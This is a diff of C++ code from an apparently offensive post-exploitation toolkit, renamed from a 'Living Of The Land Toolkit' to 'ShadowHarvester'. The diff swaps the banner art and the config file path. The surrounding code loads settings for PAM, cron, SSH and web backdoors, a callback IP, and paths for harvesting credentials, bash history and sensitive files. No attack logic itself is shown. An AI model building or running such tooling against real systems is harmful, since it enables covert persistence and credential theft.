@@ -25,21 +25,35 @@
 
 void Init::welcome() {
     std::cout << BOLD << R"(
+========================================================
+                              __
+                            .d$$b
+                          .' TO$;\
+                         /  : TP._;
+                        / _.;  :Tb|
+                       /   /   ;j$j
+                   _.-"       d$$$$
+                 .' ..       d$$$$;
+                /  /P'      d$$$$P. |\
+               /   "      .d$$$P' |\^"l
+             .'           `T$P^"""""  :
+         ._.'      _.'                ;
+      `-.-".-'-' ._.       _.-"    .-"
+    `.-" _____  ._              .-"
+   -(.g$$$$$$$b.              .'
+     ""^^T$$$P^)            .(:
+       _/  -"  /.'         /:/;
+    ._.'-'`-'  ")/         /;/;
+ `-.-"..--""   " /         /  ;
+.-" ..--""        -'          :
+..--""--.-"         (\      .-(\
+  ..--""              `-\(\/;`
+    _.                      :
+                            ;`-
+                           :\
+                           ;  ShadowHarvester v0.17
+                                Author: c0d3Ninja
 
- ██▓     ▒█████  ▄▄▄█████▓ ██▓    
-▓██▒    ▒██▒  ██▒▓  ██▒ ▓▒▓██▒    
-▒██░    ▒██░  ██▒▒ ▓██░ ▒░▒██░    
-▒██░    ▒██   ██░░ ▓██▓ ░ ▒██░    
-░██████▒░ ████▓▒░  ▒██▒ ░ ░██████▒ 
-░ ▒░▓  ░░ ▒░▒░▒░   ▒ ░░   ░ ▒░▓  ░
-░ ░ ▒  ░  ░ ▒ ▒░     ░    ░ ░ ▒  ░
-  ░ ░   ░ ░ ░ ▒    ░        ░ ░   
-    ░  ░    ░ ░               ░  ░
-
-    Living Of The Land Toolkit
-
-Author:  c0d3Ninja
-Version: v0.17
 
 ========================================================
     )" << RESET << std::endl;
@@ -97,21 +111,21 @@ void Init::checkDependencies() {
     Config ParseConf;
     Config OutputConf;
 
-    ParseConf.required = parseDependencies("config/lotl.conf", "required");
-    ParseConf.optional = parseDependencies("config/lotl.conf", "optional");
-    ParseConf.backdoor = parseDependencies("config/lotl.conf", "backdoor");
-    ParseConf.ip = parseDependencies("config/lotl.conf", "ip");
-    ParseConf.pam = parseDependencies("config/lotl.conf", "pam");
-    ParseConf.cron = parseDependencies("config/lotl.conf", "cron");
-    ParseConf.ssh = parseDependencies("config/lotl.conf", "ssh");
-    ParseConf.www = parseDependencies("config/lotl.conf", "www");
-    ParseConf.user = parseDependencies("config/lotl.conf", "user");
-    ParseConf.credPaths = parsePaths("config/lotl.conf", "checkCreds");
-    ParseConf.bashHistory = parsePaths("config/lotl.conf", "checkBashHistory");
-    ParseConf.logs = parsePaths("config/lotl.conf", "checkLogs");
-    ParseConf.checkSSH = parsePaths("config/lotl.conf", "checkSSH");
-    ParseConf.backUP = parsePaths("config/lotl.conf", "CheckBackUp");
-    ParseConf.sensitive = parsePaths("config/lotl.conf", "checkSensitive");
+    ParseConf.required = parseDependencies("config/shadow.conf", "required");
+    ParseConf.optional = parseDependencies("config/shadow.conf", "optional");
+    ParseConf.backdoor = parseDependencies("config/shadow.conf", "backdoor");
+    ParseConf.ip = parseDependencies("config/shadow.conf", "ip");
+    ParseConf.pam = parseDependencies("config/shadow.conf", "pam");
+    ParseConf.cron = parseDependencies("config/shadow.conf", "cron");
+    ParseConf.ssh = parseDependencies("config/shadow.conf", "ssh");
+    ParseConf.www = parseDependencies("config/shadow.conf", "www");
+    ParseConf.user = parseDependencies("config/shadow.conf", "user");
+    ParseConf.credPaths = parsePaths("config/shadow.conf", "checkCreds");
+    ParseConf.bashHistory = parsePaths("config/shadow.conf", "checkBashHistory");
+    ParseConf.logs = parsePaths("config/shadow.conf", "checkLogs");
+    ParseConf.checkSSH = parsePaths("config/shadow.conf", "checkSSH");
+    ParseConf.backUP = parsePaths("config/shadow.conf", "CheckBackUp");
+    ParseConf.sensitive = parsePaths("config/shadow.conf", "checkSensitive");
 
     // Get the ip from the conf file to use for the backdoor
     std::vector<std::string> IP;
